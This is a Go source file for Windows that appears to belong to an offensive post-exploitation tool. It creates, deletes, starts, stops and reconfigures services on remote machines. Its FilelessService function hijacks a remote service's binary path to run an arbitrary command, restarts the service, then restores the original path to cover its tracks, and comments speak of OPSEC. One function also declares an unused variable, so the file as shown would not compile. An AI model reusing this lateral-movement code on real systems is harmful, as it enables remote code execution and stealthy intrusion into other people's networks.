//go:build windows
// +build windows

package services

import (
	"errors"
	"fmt"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

func ModifyServiceBinary(args []string) (string, error) {
	if len(args) < 3 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	serviceBinary := args[2]
	serviceMgr, err := mgr.Connect()
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	s, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return "", err
	}
	defer s.Close()
	c, err := s.Config()
	if err != nil {
		return "", err
	}
	oldBinPath := c.BinaryPathName
	c.BinaryPathName = serviceBinary
	err = s.UpdateConfig(c)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] Service binpath Updated from %s to %s", oldBinPath, c.BinaryPathName), nil
}

func FilelessService(args []string) (string, error) {
	// Modify BITS Service And Put powershell
	// https://github.com/juliourena/SharpNoPSExec <- status topped start type manual or disabled.
	if len(args) < 3 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	serviceBinary := args[2]
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	s, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return "", err
	}
	defer s.Close()
	c, err := s.Config()
	if err != nil {
		return "", err
	}
	oldBinPath := c.BinaryPathName
	c.BinaryPathName = serviceBinary
	err = s.UpdateConfig(c)
	if err != nil {
		return "", err
	}
	s.Control(svc.Stop)
	c1 := make(chan string, 1)
	time.Sleep(time.Second * 5)
	go func() {
		s.Start()
		c1 <- "done"
	}()
	select {
	case <-c1:
		break
	case <-time.After(30 * time.Second):
		return "", errors.New("[+] Your command might have executed but the service is now hung. Bad OPSEC")
	}
	time.Sleep(time.Second * 5)
	c, err = s.Config()
	if err != nil {
		return "", err
	}
	c.BinaryPathName = oldBinPath
	err = s.UpdateConfig(c)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] Should Have Worked"), nil
}

func DeleteService(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return "", err
	}
	defer service.Close()
	err = service.Delete()
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Deleted %s Service", service.Name), nil
}

func StartService(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return "", err
	}
	defer service.Close()
	service.Start()
	return fmt.Sprintf("Started %s Service", service.Name), nil
}

func StopService(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return "", err
	}
	defer service.Close()
	_, err = service.Control(svc.Stop)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Stopped %s Service", service.Name), nil
}

func CreateService(args []string) (string, error) {
	if len(args) < 3 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	serviceBinary := args[2]
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	c := mgr.Config{}
	service, err := serviceMgr.CreateService(serviceName, serviceBinary, c)
	if err != nil {
		return "", err
	}
	defer service.Close()
	return fmt.Sprintf("Created %s Service", service.Name), nil
}
